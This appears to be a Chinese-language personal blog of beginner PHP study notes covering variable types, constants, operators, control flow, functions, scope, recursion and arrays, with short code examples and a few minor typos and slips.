<h4 id="三、变量类型"><a href="#三、变量类型" class="headerlink" title="三、变量类型"></a>三、变量类型</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概述：</span><br><span class="line">	变量类型就是指保存在该变量中的数据类型</span><br><span class="line">	具有相同类型的类型才能彼此操作</span><br><span class="line">	</span><br><span class="line">	在强类型的语言中例如:C语言、java等，变量需要先指定类型，然后才能存储对应指定的数据</span><br><span class="line">	但是PHP是一种弱类型的语言，和其他语言不同的是，变量或者常量的数据类型由程序上下文决定</span><br><span class="line">	不需要示先声明类型</span><br><span class="line">	</span><br><span class="line"> 1、变量类型</span><br><span class="line"> 	使用var_dump(变量名) &#x2F;&#x2F; 可以输出变量的类型</span><br><span class="line"> 	$a &#x3D; true;</span><br><span class="line">	var_dump($a);	&#x2F;&#x2F; 返回true</span><br><span class="line"></span><br><span class="line"> 	1) bool(布尔型)</span><br><span class="line">        布尔型只有两个，true和false，真或假</span><br><span class="line">        以下值认为是false，其他值被认为是true</span><br><span class="line">        ①布尔值false</span><br><span class="line">        ②0</span><br><span class="line">        ③浮点数0.0</span><br><span class="line">        ④空白字符串和字符串0</span><br><span class="line">        ⑤没有成员组的数组</span><br><span class="line">        ⑥NULL</span><br><span class="line"> 	</span><br><span class="line"> 	2) int(整形)</span><br><span class="line"> 		存储整数</span><br><span class="line"> 		</span><br><span class="line"> 	3) float(浮点型)</span><br><span class="line"> 		存储小数</span><br><span class="line"> 		</span><br><span class="line"> 	4) str(字符型)</span><br><span class="line"> 		使用单引号，双引号，定界符就是字符</span><br><span class="line"> 		PHP也是可以使用\反斜杠进行转义</span><br><span class="line"> 		单引号:</span><br><span class="line"> 			在单引号中不管放什么变量都不会查找</span><br><span class="line"> 			&#x2F;&#x2F; 他不管你单引号中有什么东西，都会给你直接输出</span><br><span class="line"> 				$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &#39;hand $a some&#39;;</span><br><span class="line">                echo $b; &#x2F;&#x2F;输出结果是: hand $a some</span><br><span class="line">          </span><br><span class="line">		双引号:</span><br><span class="line">            在双引号中，如果你放入其他变量他就会进行查找</span><br><span class="line">            &#x2F;&#x2F; 输出结果会报错，因为双引号中有$a变量，PHP会进行查找，</span><br><span class="line">            		查找之后发现变量a后面还跟着some，但是却没有$asome这个变量所以报错</span><br><span class="line"> 				$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &quot;hand$asome&quot;;</span><br><span class="line">                echo $b; </span><br><span class="line">             正确语法:</span><br><span class="line">             &#x2F;&#x2F; 这里应该使用花括号将其括起来，跟后面字符分隔开，表示花括号内的是变量</span><br><span class="line">             	$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &quot;hand&#123;$a&#125;some&quot;;</span><br><span class="line">                echo $b;	&#x2F;&#x2F;输出结果是:hand1some,true转换成数字是1</span><br><span class="line">		</span><br><span class="line">		定界符:</span><br><span class="line">			&lt;&lt;&lt;之后提供一个标识符开始，然后是 字符串的内容 最后是同样的标识符结束</span><br><span class="line">			注意:标识符之后必须接，不可以用其他的任何字符。</span><br><span class="line">			语法:</span><br><span class="line">                $a &#x3D; &lt;&lt;&lt;handsome</span><br><span class="line">                我现在是字符串吗？</span><br><span class="line">                handsome;</span><br><span class="line">                var_dump($a);</span><br><span class="line">            &#x2F;&#x2F; 如果其中也要加入其他变量的话，也需要把要加入的变量用花括号括起来</span><br><span class="line">            &#x2F;&#x2F; 如果不加花括号会报错，和双引号一样，而在定界符中可以包含单引号和双引号</span><br><span class="line">            语法:</span><br><span class="line">            	$b &#x3D; &quot;一个&quot;;</span><br><span class="line">            	$a &#x3D; &lt;&lt;&lt;handsome	</span><br><span class="line">                &#39;&#39;&#39;我现&#39;在&quot;是&#123;$b&#125;字符&quot;串&quot;&quot;吗？</span><br><span class="line">                handsome;	&#x2F;&#x2F; 结尾的标识符必须和开头定界符后面跟的标识符相同</span><br><span class="line">                var_dump($a);</span><br><span class="line">			</span><br><span class="line"> 	5) array(数组)</span><br><span class="line">    	数组是PHP中一种重要的符合数据类型。</span><br><span class="line">    	之前的类型只能存入一个数据，而数组可以存放多个数据，并且可以存入任何类型的数据。</span><br><span class="line">    	跳过，后面课程讲解</span><br><span class="line"> 	6) object(对象)</span><br><span class="line"> 		跳过，后面课程讲解</span><br><span class="line"> 	7)resourse(自愿)</span><br><span class="line"> 		跳过，后面课程讲解</span><br><span class="line"> 	8)NULL</span><br><span class="line"> 		NULL表示空</span><br><span class="line"> 			&#x2F;&#x2F; a变量没有赋值，也就相当于没有这个变量，返回NULL</span><br><span class="line"> 			&#x2F;&#x2F; 可以将a删除，然后直接打印a的数据类型，结果一样为NULL</span><br><span class="line">            $a;</span><br><span class="line">            var_dump($a);</span><br><span class="line">            </span><br><span class="line">2、变量类型转换</span><br><span class="line">	1) 自动类型转换</span><br><span class="line">		布尔值:</span><br><span class="line">			布尔值参与运算时，true转换为整型为 1 ， false 为 0</span><br><span class="line">			null值参与运算时，null转换为整形0</span><br><span class="line">			int型和float数据参与运算时，先把int转换为float类型后在进行运算</span><br><span class="line">			有字符串和数字型(int或者float)参与运算时的情况</span><br><span class="line">				- 这些都是程序运行中不太可控的部分所以在编写代码时最好不要涉及</span><br><span class="line">			</span><br><span class="line">	2) 强制类型转换</span><br><span class="line">		在要转换的变量之前加上括号括起来目标类型</span><br><span class="line">			语法：</span><br><span class="line">				$a &#x3D; &quot;test&quot;;</span><br><span class="line">                $b &#x3D; (int)$a;</span><br><span class="line">                var_dump($b);  &#x2F;&#x2F; 转换结果是 int(0)</span><br><span class="line">			(int)</span><br><span class="line">			(bool)</span><br><span class="line">			(float)</span><br><span class="line">			(string)</span><br><span class="line">			(array)</span><br><span class="line">			(object)</span><br><span class="line">			</span><br><span class="line">		转变并不会改变被转换变量本身的类型 </span><br><span class="line">		</span><br><span class="line">	3)变量类型测试函数</span><br><span class="line">		语法：</span><br><span class="line">			$a &#x3D; 10;</span><br><span class="line">			var_dump(is_int($a));</span><br><span class="line">			</span><br><span class="line">		is_bool()	&#x2F;&#x2F; 检测一个变量是否为布尔值</span><br><span class="line">		is_int()	&#x2F;&#x2F; 检测一个变量是否为整数</span><br><span class="line">		is_array()	&#x2F;&#x2F; 检测一个变量是否为数组</span><br><span class="line">		等等....</span><br></pre></td></tr></table></figure>

<h4 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、概念</span><br><span class="line">    常量也是用于临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器</span><br><span class="line">2、定义和使用</span><br><span class="line">	语法：</span><br><span class="line">	&#x2F;&#x2F; 定义常量名称的时候需要用引号将常量名称括起来，单引双引都可以</span><br><span class="line">		define(&#39;常量名称&#39;,常量值);		</span><br><span class="line">	&#x2F;&#x2F; 检查是否定义了某个常量</span><br><span class="line">		defined()函数	</span><br><span class="line">	常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量名称总是大写的</span><br><span class="line">3、常量变量的区别</span><br><span class="line">	1)常量只能用define()函数定义，不能通过赋值语句</span><br><span class="line">	2)常量只能用define()定义，不能通过赋值语句</span><br><span class="line">	3)常量可以不用理会变量范围的规则在任何地方定义和使用</span><br><span class="line">	4)常量一旦被定义就不能被重新定义或者取消定义</span><br><span class="line">	5)常量的值只能是bool，int，float，string类型</span><br><span class="line">4、预定义常量</span><br><span class="line">	预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量</span><br><span class="line">	其中有的预定义常量是以__两个下划线开头的，这些预定义常量我们又叫他魔术常量</span><br><span class="line">		代码所在的位置不同他的值也是不同的，所以他叫 魔术常量</span><br><span class="line">	</span><br><span class="line"> 这些特殊的常量是不区分大小写的，还是一样，建议最好常量使用大写，这样不容易混淆</span><br><span class="line"> 而自己定义的常量是严格区分大小写的</span><br><span class="line">	常量名				常量值</span><br><span class="line">	__FILE__		当前的文件位置</span><br><span class="line">	__LINE__		当前所在行数</span><br><span class="line">	__FUNCTION__	当前的函数名</span><br><span class="line">	__CLASS__		当前的类名</span><br><span class="line">	__METHOD__		当前对象的方法名</span><br><span class="line">	等等....</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582178905188.png" alt="1582260055891"></p>
<h4 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运算符对一个或者多个操作数(变量或者数值)执行某种运算符的符号，也称操作符~</span><br><span class="line"></span><br><span class="line">1、算术运算符</span><br><span class="line">	+	两边数值相加</span><br><span class="line">	-	两边数值相减，也可以取反，取反的时候并不会影响到被取反变量本身的值</span><br><span class="line">	*	两边数值相乘</span><br><span class="line">	&#x2F;	两边数值相除</span><br><span class="line">	%	两边数值相除，并求余</span><br><span class="line">	++	自加1</span><br><span class="line">	--	自减1</span><br><span class="line">	注意:自增自减是对变量而言的</span><br><span class="line">2、字符串运算符</span><br><span class="line">	PHP中的字符串运算符只有一个英文的句号 &quot; . &quot; 也叫连接运算符</span><br><span class="line">		$a &#x3D; &quot;孙悟空&quot;;</span><br><span class="line">        $b &#x3D; &quot;在水帘洞居住&quot;;</span><br><span class="line">        $c &#x3D; $a.$b;</span><br><span class="line">        echo $c;	&#x2F;&#x2F; 输出结果是:孙悟空在水帘洞居住</span><br><span class="line">3、赋值运算符</span><br><span class="line">	二元运算符</span><br><span class="line">		左边的操作数必须是变量，右边可以是表达式，也可以是一个值，一个变量等等</span><br><span class="line">		作用:将右边表达式的值赋给左边变量</span><br><span class="line">	&#x3D; 		</span><br><span class="line">	+&#x3D;</span><br><span class="line">	-&#x3D;</span><br><span class="line">	*&#x3D;</span><br><span class="line">	&#x2F;&#x3D;</span><br><span class="line">	%&#x3D;</span><br><span class="line">	.&#x3D;</span><br><span class="line">4、比较运算符</span><br><span class="line">	对操作数进行比较</span><br><span class="line">		如果比较结果满足于比较运算符要求，返会结果true，否则false</span><br><span class="line">	&#x3D;&#x3D;		等于</span><br><span class="line">	&#x3D;&#x3D;&#x3D;		全等于(值要相等，类型也要相等)</span><br><span class="line">	!&#x3D;		不等于</span><br><span class="line">	&lt;&gt;		不等于</span><br><span class="line">	!&#x3D;&#x3D;		不全等于</span><br><span class="line">	&lt;&#x3D;		小于等于</span><br><span class="line">	&lt;		小于</span><br><span class="line">	&gt;&#x3D;		大于等于</span><br><span class="line">	&gt;		大于</span><br><span class="line">5、逻辑运算符</span><br><span class="line">概念:</span><br><span class="line">	对表达式进行逻辑运算，运算出的结果是布尔类型</span><br><span class="line">	要求:</span><br><span class="line">		参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被自动转换成布尔类型的值</span><br><span class="line">	逻辑与</span><br><span class="line">		and 或者 &amp;&amp;  		&#x2F;&#x2F;运算结果两边都为true结果为true，否则为false</span><br><span class="line">	逻辑或</span><br><span class="line">		or 或者 ||		&#x2F;&#x2F;运算结果有一边为true结果为true</span><br><span class="line">	逻辑异或</span><br><span class="line">		xor				&#x2F;&#x2F;只有两边值不一样的时候结果为true，如果两边值一样就是false</span><br><span class="line">	逻辑非</span><br><span class="line">		！			&#x2F;&#x2F;将原来的值否定，如果是true返回false，如果是false返回true</span><br><span class="line">6、其他运算符</span><br><span class="line">	1) ? :		&#x2F;&#x2F;三元运算符</span><br><span class="line">	格式:</span><br><span class="line">		表达式1 ? 表达式2 : 表达式3;</span><br><span class="line">		如果表达式1的值为true，那么就执行表达式2，否则执行表达式3   </span><br><span class="line">	2) &#96;&#96;</span><br><span class="line">		可以吧系统的命令放到里面执行！</span><br><span class="line">		基本用不到，涉及到跨平台</span><br><span class="line">	3) @</span><br><span class="line">		屏蔽表达式发生的错误</span><br><span class="line">		echo @$a;</span><br><span class="line">	4)&#x3D;&gt;</span><br><span class="line">	5)-&gt;</span><br><span class="line">	6)instanceot</span><br><span class="line">7、运算符优先级</span><br><span class="line">		谁的优先级高先算谁，如果实在不知道谁的优先级高，使用()括号将其括起来</span><br></pre></td></tr></table></figure>

<h4 id="一、流程控制"><a href="#一、流程控制" class="headerlink" title="一、流程控制"></a>一、流程控制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对PHP程序执行的过程进行控制</span><br><span class="line">PHP有哪些手段对程序过程进行控制</span><br><span class="line"></span><br><span class="line">一、顺序执行</span><br><span class="line">		顺序执行非常简单就是从上往下执行即可</span><br><span class="line">二、分支执行</span><br><span class="line">		分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句(if,switch)来实现</span><br><span class="line">		</span><br><span class="line">	1、if语句</span><br><span class="line">		1) 单向条件</span><br><span class="line">		if(表达式)语句;</span><br><span class="line">			格式:</span><br><span class="line">				if($result &gt;&#x3D; $number)&#123;</span><br><span class="line">						echo &quot;恭喜你考试成功&quot;;</span><br><span class="line">					&#125; </span><br><span class="line">					</span><br><span class="line">		2)双向条件</span><br><span class="line">			if&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		3)多向条件</span><br><span class="line">			if(表达式)&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			elseif&#123;</span><br><span class="line">				语句块...</span><br><span class="line">			&#125;</span><br><span class="line">			elseif&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				语句块...</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">	2、switch语句</span><br><span class="line">		格式:</span><br><span class="line">			switch(表达式)&#123;</span><br><span class="line">				case 值 1:</span><br><span class="line">					语句块1</span><br><span class="line">					break</span><br><span class="line">				case 值 2:</span><br><span class="line">					语句块2</span><br><span class="line">					break</span><br><span class="line">				......</span><br><span class="line">                default:</span><br><span class="line">                	语句块n</span><br><span class="line">			&#125;</span><br><span class="line">		注意点:</span><br><span class="line">			1)表达式的值最好是整形或者字符串！</span><br><span class="line">			2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break</span><br><span class="line">			3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下的</span><br></pre></td></tr></table></figure>

<h4 id="二、、循环语句"><a href="#二、、循环语句" class="headerlink" title="二、、循环语句"></a>二、、循环语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重复执行某些操作</span><br><span class="line"></span><br><span class="line">while</span><br><span class="line">do...while</span><br><span class="line">for</span><br><span class="line"></span><br><span class="line">while循环</span><br><span class="line">	while(表达式)&#123;</span><br><span class="line">		语句... 再自加一</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">do...while循环</span><br><span class="line">	do&#123;</span><br><span class="line">		语句...</span><br><span class="line">	&#125;while(表达式)</span><br><span class="line"></span><br><span class="line">for循环</span><br><span class="line">	for(表达式1,表达式2,表达式3)&#123;</span><br><span class="line">		语句...</span><br><span class="line">	&#125;</span><br><span class="line">	表达式1:会放一些初始化的语句，$a&#x3D;0,</span><br><span class="line">	表达式2:循环次数，一般用比较操作符来判断操作次数，a&lt;&#x3D;5</span><br><span class="line">	表达式3:自增1，每次循环完毕都自身加1, a++</span><br></pre></td></tr></table></figure>

<h4 id="特殊的流程控制语句"><a href="#特殊的流程控制语句" class="headerlink" title="特殊的流程控制语句"></a>特殊的流程控制语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、break语句</span><br><span class="line">	退出循环	break 后面可以接上数字表示跳出几层循环，break 2 表示跳出两层循环</span><br><span class="line">2、continue语句</span><br><span class="line">	跳过本次循环</span><br><span class="line">3、exit()语句</span><br><span class="line">	结束整个程序的执行</span><br></pre></td></tr></table></figure>

<h4 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用函数的优点</span><br><span class="line">	提高软件的可维护性</span><br><span class="line">	提高软件的开发效率</span><br><span class="line">	提高软件的重用性</span><br><span class="line">	</span><br><span class="line">函数的创建和调用</span><br><span class="line">	&#x2F;&#x2F;创建一个fun函数，函数内部输出内容Hello</span><br><span class="line">    function fun()&#123;</span><br><span class="line">        echo &#39;Hello&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;调用函数，函数名后面需要加括号</span><br><span class="line">    fun();</span><br><span class="line">	</span><br><span class="line">一、自定义函数</span><br><span class="line">	1、函数的定义</span><br><span class="line">	function 函数名([参数1，参数2,....])&#123;</span><br><span class="line">	return 表达式;&#x2F;&#x2F;可以从函数中返回一个值，也可以不返回</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	2、函数的调用</span><br><span class="line">	不管是自己定义的函数还是系统提供的函数，如果函数不被调用就不会执行！</span><br><span class="line">	调用：函数被调用后开始执行函数体中代码，执行的过程是相对独立的，执行完毕返回调用的位置继	续向下执行</span><br><span class="line">	</span><br><span class="line">	3、函数的参数</span><br><span class="line">	形式参数由零个、一个或者多个变量组成。</span><br><span class="line">	实际参数由零个、一个或者多个参数组成，每个参数是一个表达式，用逗号分隔</span><br><span class="line">	</span><br><span class="line">	4、函数的返回值</span><br><span class="line">	函数的返回值是是将函数执行后的结果返回给调用者</span><br><span class="line">	默认如果不写返回则函数的返回值为NULL</span><br><span class="line">	</span><br><span class="line">二、变量的范围</span><br><span class="line">	1、局部变量</span><br><span class="line">	        function fun()&#123;</span><br><span class="line">            echo $i;</span><br><span class="line">            $a&#x3D;1;	&#x2F;&#x2F;局部变量</span><br><span class="line">            &#125;</span><br><span class="line">		局部变量也称为内部变量，局部变量实在函数内定义的，作用域仅限于函数的内部。</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	2、全局变量</span><br><span class="line">			$i&#x3D;10;	&#x2F;&#x2F;全局变量</span><br><span class="line">            function fun()&#123;</span><br><span class="line">                global $i;	&#x2F;&#x2F;声明$i为全局变量，然后在这个函数内部就可以使用$i</span><br><span class="line">                echo $i;</span><br><span class="line">                $a&#x3D;1;	</span><br><span class="line">            &#125;</span><br><span class="line">            fun();</span><br><span class="line">		全局变量也被称为外部变量，在函数的外部定义的，作用域从定义处到程序文件的末尾</span><br><span class="line">		在PHP函数中无法直接使用全局变量，如需使用必须使用global声明变量</span><br><span class="line">	3、静态变量</span><br><span class="line">	        function fun()&#123;</span><br><span class="line">            static $a&#x3D;1;	&#x2F;&#x2F;静态变量$a,初始化静态变量，仅在第一次调用的时候执行</span><br><span class="line">            echo ++$a;	&#x2F;&#x2F;当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然							存在</span><br><span class="line">            &#125;</span><br><span class="line">            fun();</span><br><span class="line">            echo &#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">            fun();</span><br><span class="line">		静态变量的是值在函数内部定义的时候static关键字来定义变量特点：函数执行完毕之后变量			不会立即消失，再次调用函数的时候，静态变量保存的值依然存在，并且仅在第一次执行				函数的时候会初始化值</span><br></pre></td></tr></table></figure>

<h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、函数的传递</span><br><span class="line">	1、案值传递参数</span><br><span class="line">		默认的，我们在传递参数的时候默认使用的就是这个方式！</span><br><span class="line">		对形式参数的操作，根本不会影响到实际参数的值两者相当于没有联系</span><br><span class="line">		function fun($a)&#123;</span><br><span class="line">            echo ++$a;</span><br><span class="line">        &#125;</span><br><span class="line">        $i &#x3D; 10;</span><br><span class="line">        fun($i);	&#x2F;&#x2F; 打印结果 11</span><br><span class="line">        echo &#39;&lt;br &#x2F;&gt;&#39;,$i;	&#x2F;&#x2F; 打印结果10</span><br><span class="line">	2、按引用传递参数</span><br><span class="line">		按引用传递参数，相当于形式参数和实际参数是同一个值，只是名字不一样，相当于起了个别名</span><br><span class="line">		对于形式参数的操作会直接影响到实际参数</span><br><span class="line">		function fun(&amp;$a)&#123;</span><br><span class="line">            echo ++$a;</span><br><span class="line">        &#125;</span><br><span class="line">        $i &#x3D; 10;</span><br><span class="line">        fun($i);	&#x2F;&#x2F; 打印结果11</span><br><span class="line">        echo &#39;&lt;br &#x2F;&gt;&#39;, $i;	&#x2F;&#x2F; 打印结果11</span><br><span class="line">	3、函数的默认参数</span><br><span class="line">		可以给形式参数设置默认值，设置发方法直接赋值即可</span><br><span class="line">		给形式参数加默认值的时候是从右往左加，右边的必须有，才能给左边的加，</span><br><span class="line">		右边必须加的值就是默认值</span><br><span class="line">		&#x2F;&#x2F; $b&#x3D;10就是默认值</span><br><span class="line">		function fun($a,$b&#x3D;10)&#123;</span><br><span class="line">            echo $a+$b;</span><br><span class="line">        &#125;</span><br><span class="line">        fun(20);		</span><br><span class="line">	4、可变长度参数列表</span><br><span class="line">		PHP提供了三个函数，可以直接使用</span><br><span class="line">		func_get_args();</span><br><span class="line">		func_get_arg();</span><br><span class="line">		func_num_args();</span><br><span class="line">		这三个函数可以使用在自定义函数内部，能够给我们返回一些关于参数的信息</span><br><span class="line">		function test()&#123;</span><br><span class="line">        &#x2F;&#x2F;	var_dump(func_get_args());	&#x2F;&#x2F;做一些其他操作</span><br><span class="line">        &#x2F;&#x2F;	var_dump(func_get_arg(1));	&#x2F;&#x2F;调用这个函数的时候可以传入一个值表示获取第												几个实际参数(从0开始)，感觉类似索引</span><br><span class="line">            var_dump(func_num_args());	&#x2F;&#x2F;返回传入所在自定义函数的参数的个数，</span><br><span class="line">            								类似于	数据库的，length</span><br><span class="line">        &#125;</span><br><span class="line">        test(2313,135165,165165,&#39;uiashdinsauiod&#39;);	&#x2F;&#x2F; 自定义函数参数个数</span><br></pre></td></tr></table></figure>

<h4 id="四、可变函数"><a href="#四、可变函数" class="headerlink" title="四、可变函数"></a>四、可变函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">就是把一个函数赋值给变量</span><br><span class="line">function test()&#123;</span><br><span class="line">	echo &#39;我是TEST函数&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a  &#x3D; &#39;test&#39;;	&#x2F;&#x2F; $a &#x3D; test();</span><br><span class="line">echo $a();		&#x2F;&#x2F; echo a;	&#x2F;&#x2F;这种也能输出，但不知道后续有什么问题</span><br></pre></td></tr></table></figure>

<h4 id="五、递归函数"><a href="#五、递归函数" class="headerlink" title="五、递归函数"></a>五、递归函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">递归函数即在函数内部自己调用自己的函数.</span><br><span class="line">递归函数:</span><br><span class="line">    1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，函数在执行过程中默认之间	 没有任何联系，除了(静态变量，接引用传，全局变量),里面的变量默认都是局部变量</span><br><span class="line">    2)递归函数，在函数的内部需要有适时结束函数运行的条件</span><br><span class="line">在使用递归的时候避免死循环</span><br><span class="line">function fun($i)&#123;</span><br><span class="line">	echo $i.&#39;&amp;nbsp;&#39;;</span><br><span class="line">	if($i&gt;0)&#123;</span><br><span class="line">		fun($i-1);	&#x2F;&#x2F; 自己内部调用自己，即 递归函数</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &#39;&lt;- - -&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo $i.&#39;&amp;nbsp;&#39;;</span><br><span class="line"> &#125;</span><br><span class="line"> &#x2F;&#x2F; </span><br><span class="line"> fun(3);&#x2F;&#x2F;返回结果是 3 2 1 0 &lt;- - -&gt;0 1 2 3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582385640406.png" alt="1582356332678"></p>
<h4 id="六、内置函数"><a href="#六、内置函数" class="headerlink" title="六、内置函数"></a>六、内置函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP提供给我们许多现成的函数或者结构，我们可以在实际的开发中直接使用</span><br><span class="line">使用函数使用来完成功能的，说白了，有这样的需求，才会找对应的函数！</span><br></pre></td></tr></table></figure>

<h4 id="理解数组和创建数组"><a href="#理解数组和创建数组" class="headerlink" title="理解数组和创建数组"></a>理解数组和创建数组</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">思路</span><br><span class="line">    数组概论:</span><br><span class="line">        可以把这些单个数据都联合起来(打包、捆绑)起来，作为一个整体</span><br><span class="line">            这个数据类型就是  数组 他是一种 复合数据类型</span><br><span class="line"></span><br><span class="line">    数组类型：</span><br><span class="line">        索引值:将相当于给里面的每一个数据起个名字</span><br><span class="line">        名字如果取得是整型：那么这个数组就是索引数组</span><br><span class="line">        如果名字是字符串类：那么这个数组就是  关联数组</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582519884665.png" alt="1582381577238"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数组创建:</span><br><span class="line">PHP中创建数组非常灵活，与其他许多编程语言不同的是PHP不需要在创建数组时，指定数组的大小(指定数组里面可以放几个数据)，甚至不需要在使用数组之前声明，也可以在同一个数组中存放任何了型的数据。</span><br><span class="line">	· 直接为元素赋值即可创建数组</span><br><span class="line">	· 使用array()语言结构创建数组</span><br><span class="line">1、直接为数组元素赋值创建数组</span><br><span class="line">	$变量名[索引值]&#x3D;数据内容;</span><br><span class="line">		索引值可以是整数也可以是字符串，也可以不写(默认为索引数组)</span><br><span class="line">		如果省略索引值不写那么默认索引值就是整数，并且从0开始，依次向上</span><br><span class="line">		&#x2F;&#x2F; $student[索引值]&#x3D;数据值;					不加索引值从0开始依次向上</span><br><span class="line">		$student[0]&#x3D;10;			  $student[]&#x3D;10;		  &#x2F;&#x2F; 0</span><br><span class="line">        $student[1]&#x3D;&#39;孙悟空&#39;;		$student[]&#x3D;&#39;孙悟空&#39;;	  &#x2F;&#x2F; 1</span><br><span class="line">        $student[2]&#x3D;true;		  $student[]&#x3D;true;		  &#x2F;&#x2F; 2</span><br><span class="line">        $student[3]&#x3D;60.5;		  $student[]&#x3D;60.5;	  	  &#x2F;&#x2F; 3</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 使用echo并不能输出数组，而是需要使用print_r()函数来输出打印数组</span><br><span class="line">        &#x2F;&#x2F;echo $student;</span><br><span class="line"></span><br><span class="line">        print_r($student);</span><br><span class="line">        &#x2F;&#x2F; 使用var_dump也可以输出，并且打印数据类型</span><br><span class="line">        &#x2F;&#x2F;var_dump($student);</span><br><span class="line">				</span><br><span class="line">2、使用array()结构创建数组</span><br><span class="line">	$变量名&#x3D;array(key1&#x3D;&gt;value1......);</span><br><span class="line">	创建数组</span><br><span class="line">        $student&#x3D;array(		|	&#x2F;&#x2F;可以不写索引值直接输出</span><br><span class="line">        &#39;sum&#39;&#x3D;&gt;10,			|	$student&#x3D;array(10,&#39;孙悟空&#39;,true,60.5)	</span><br><span class="line">        &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,	  |</span><br><span class="line">        &#39;sex&#39;&#x3D;&gt;true,		|</span><br><span class="line">        &#39;grade&#39;&#x3D;&gt;60.5		|</span><br><span class="line">        );					|</span><br><span class="line">        &#x2F;&#x2F;print_r($student);|</span><br><span class="line">        var_dump($student); |</span><br><span class="line">        </span><br><span class="line">使用数组里面的具体数据</span><br><span class="line">数组变量名称[索引值]</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">&#39;sum&#39;&#x3D;&gt;10,</span><br><span class="line">&#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">&#39;sex&#39;&#x3D;&gt;true,</span><br><span class="line">&#39;grade&#39;&#x3D;&gt;60.5</span><br><span class="line">);</span><br><span class="line">echo $student[&#39;name&#39;];	&#x2F;&#x2F; 数组[索引值]，输出结果&#39;孙悟空&#39;</span><br><span class="line"></span><br><span class="line">数组中还可以放数组</span><br><span class="line"></span><br><span class="line">二维数组</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">	array(1,&#39;孙悟空&#39;,true,60.5),</span><br><span class="line">	array(2,&#39;唐玄奘&#39;,true,100),</span><br><span class="line">	array(3,&#39;沙和尚&#39;,true,80.5),</span><br><span class="line">	array(4,&#39;猪八戒&#39;,true,0),</span><br><span class="line">);</span><br><span class="line">print_r($student);</span><br><span class="line">二维数组如果需要调用其中的一个值</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">	array(1,&#39;孙悟空&#39;,true,60.5),</span><br><span class="line">	array(2,&#39;唐玄奘&#39;,true,100),</span><br><span class="line">	array(3,&#39;沙和尚&#39;,true,80.5),</span><br><span class="line">	array(4,&#39;猪八戒&#39;,true,0),</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F; 0表示从第0个开始也就是从孙悟空那个数组开始，</span><br><span class="line">&#x2F;&#x2F; 3表示第0个数组里面索引是3的值</span><br><span class="line">echo $student[0][3];</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582522025507.png" alt="1582385640406"></p>
